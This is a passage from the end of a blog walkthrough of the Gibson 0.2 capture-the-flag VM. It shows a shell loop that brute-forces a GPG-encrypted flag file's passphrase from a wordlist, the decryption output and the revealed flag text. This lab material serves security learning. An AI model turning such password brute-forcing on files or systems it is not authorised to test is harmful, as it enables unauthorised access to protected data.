+</span><span class='line'>132384p 0:00:00:00 100.00% (2017-10-28 13:54) 240698p/s Z3ro k0o1</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And a quick shell script for bruteforcing from the file:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>for pass in $(cat coolpass.txt) ; do
+</span><span class='line'>  echo "Trying:" $pass
+</span><span class='line'>  gpg --batch --status-fd --with-colons --output flag.txt --passphrase $pass --decrypt flag.txt.gpg
+</span><span class='line'>  if [ -a "flag.txt" ]; then echo "Passphrase found! $pass"
+</span><span class='line'>  break
+</span><span class='line'>  fi
+</span><span class='line'>done</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The correct passphrase is <strong>Z3r0K00l</strong></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Trying: Z3r0K00l
+</span><span class='line'>gpg: CAST5 encrypted data
+</span><span class='line'>[GNUPG:] NEED_PASSPHRASE_SYM 3 3 2
+</span><span class='line'>gpg: encrypted with 1 passphrase
+</span><span class='line'>[GNUPG:] BEGIN_DECRYPTION
+</span><span class='line'>[GNUPG:] DECRYPTION_INFO 0 3
+</span><span class='line'>[GNUPG:] PLAINTEXT 62 1463231918 flag.txt
+</span><span class='line'>[GNUPG:] PLAINTEXT_LENGTH 862
+</span><span class='line'>[GNUPG:] DECRYPTION_OKAY
+</span><span class='line'>gpg: WARNING: message was not integrity protected
+</span><span class='line'>[GNUPG:] END_DECRYPTION
+</span><span class='line'>Passphrase found! Z3r0K00l</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And the flag is:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>cat flag.txt
+</span><span class='line'> _   _            _      _____ _             ____  _                  _   _
+</span><span class='line'>| | | | __ _  ___| | __ |_   _| |__   ___   |  _ \| | __ _ _ __   ___| |_| |
+</span><span class='line'>| |_| |/ _` |/ __| |/ /   | | | '_ \ / _ \  | |_) | |/ _` | '_ \ / _ \ __| |
+</span><span class='line'>|  _  | (_| | (__|   &lt;    | | | | | |  __/  |  __/| | (_| | | | |  __/ |_|_|
+</span><span class='line'>|_| |_|\__,_|\___|_|\_\   |_| |_| |_|\___|  |_|   |_|\__,_|_| |_|\___|\__(_)
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>Should you not be standing in a 360 degree rotating payphone when reading
+</span><span class='line'>this flag...? B-)
+</span><span class='line'>
+</span><span class='line'>Anyhow, congratulations once more on rooting this VM. This time things were
+</span><span class='line'>a bit esoteric, but I hope you enjoyed it all the same.
+</span><span class='line'>
+</span><span class='line'>Shout-outs again to #vulnhub for hosting a great learning tool. A special
+</span><span class='line'>thanks goes to g0blin and GKNSB for testing, and to g0tM1lk for the offer
+</span><span class='line'>to host the CTF once more.
+</span><span class='line'>                                                              --Knightmare</span></code></pre></td></tr></table></div></figure>
+
+
+<p><strong>Learn more</strong></p>
+
+<ul>
+<li><a href="https://imagetragick.com/">ImageTragick</a></li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'> ________________________________________
+</span><span class='line'>/ Q: Why is Christmas just like a day at \
+</span><span class='line'>| the office? A: You do all of the work  |
+</span><span class='line'>| and the fat guy in the suit            |
+</span><span class='line'>|                                        |
+</span><span class='line'>\ gets all the credit.                   /
+</span><span class='line'> ----------------------------------------
+</span><span class='line'>        \   ^__^
+</span><span class='line'>         \  (oo)\_______
+</span><span class='line'>            (__)\       )\/\
+</span><span class='line'>                ||----w |
+</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>
+
+
+
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">chousensha</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2017-10-28T16:10:23-04:00" pubdate data-updated="true">Oct 28<span>th</span>, 2017</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/penetration-testing/'>penetration testing</a>, <a class='category' href='/blog/categories/writeups/'>writeups</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://chousensha.github.io/blog/2017/10/28/gibson-0-dot-2-walkthrough/" data-via="chous3nsha" data-counturl="http://chousensha.github.io/blog/2017/10/28/gibson-0-dot-2-walkthrough/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2017/09/24/kvm-virtualization-on-linux-hosts/" title="Previous Post: KVM virtualization on Linux hosts">&laquo; KVM virtualization on Linux hosts</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>whoami</h1>
+  <p>switch (interests){<br>
+ case INFORMATION SECURITY:<br>
+Mostly offensive security, but trying to be well-rounded in everything;<br>
+case PYTHON:<br>
+Mainly security and sysadmin related scripting;<br>
+case LINUX:<br>
+Greetings from /dev/null;<br>
+case JAPANESE:<br>
+Language, anime, samurai;<br>
+case MARTIAL ARTS:<br>
+If it's fighting I like it;<br>
+case MILITARY SCIENCE:<br>
+Ancient, medieval, modern;<br>
+default: GAMING;}</p>
+</section>
+<section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2017/10/28/gibson-0-dot-2-walkthrough/">Gibson 0.2 walkthrough</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2017/09/24/kvm-virtualization-on-linux-hosts/">KVM virtualization on Linux hosts</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2017/09/10/nfs-shares-on-centos-7/">NFS shares on CentOS 7</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2017/07/16/sslyze-kali-linux-tools/">sslyze - Kali Linux tools</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2017/07/12/dnsrecon-kali-linux-tools/">dnsrecon - Kali Linux tools</a>
+      </li>
+    
+  </ul>
+</section>
+
+<section>
+  <h1>GitHub Repos</h1>
+  <ul id="gh_repos">
+    <li class="loading">Status updating...</li>
+  </ul>
+  
+  <a href="https://github.com/chousensha">@chousensha</a> on GitHub
+  
+  <script type="text/javascript">
+    $(document).ready(function(){
+        if (!window.jXHR){
+            var jxhr = document.createElement('script');
+            jxhr.type = 'text/javascript';
+            jxhr.src = '/javascripts/libs/jXHR.js';
+            var s = document.getElementsByTagName('script')[0];
+            s.parentNode.insertBefore(jxhr, s);
+        }
+
+        github.showRepos({
+            user: 'chousensha',
+            count: 5,
+            skip_forks: true,
+	    skip_repos: [ "chousensha.github.io" ],
+            target: '#gh_repos'
+        });
+    });
+  </script>
+  <script src="/javascripts/github.js" type="text/javascript"> </script>
+</section>
+
+
+<section>
+  <h1>Latest Tweets</h1>
+  <ul id="tweets">
+    <a class="twitter-timeline" data-dnt="true" href="https://twitter.com/chous3nsha" data-widget-id="733738822597550081" data-link-color="#1863a1" data-tweet-limit="3" data-chrome="noheader nofooter transparent noscrollbar">Tweets by @chous3nsha</a>
+    <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
+  </ul>
+  
+    <a href="http://twitter.com/chous3nsha" class="twitter-follow-button" data-show-count="true">Follow @chous3nsha</a>
+  
+</section>
+
+<section>
+  <h1>Blogroll</h1>
+  <p><a href="https://blog.g0tmi1k.com/">g0tmi1k</a></p>
+  <p><a href="http://redteamjournal.com/">Red Team Journal</a></p>
+  <p><a href="https://www.corelan.be/">Corelan Team</a></p>
+  <p><a href="http://www.madirish.net/">Mad Irish</a></p>
+  <p><a href="http://redteams.net/blog/">redteams.net</a></p>
+  <p><a href="https://www.mattandreko.com/">MattAndreko.com</a></p>
+  <p><a href="http://blog.portswigger.net/">Portswigger Web Security</a></p>
+  <p><a href="http://blog.cobaltstrike.com/">Cobalt Strike blog</a></p>
+  <p><a href="https://highon.coffee/blog/">HighOn.Coffee</a></p>
+  <p><a href="https://pentestlab.blog/">Penetration Testing Lab</a></p
+</section>
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2017 - chousensha -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'coredumpoverflow';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://chousensha.github.io/blog/2017/10/28/gibson-0-dot-2-walkthrough/';
+        var disqus_url = 'http://chousensha.github.io/blog/2017/10/28/gibson-0-dot-2-walkthrough/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
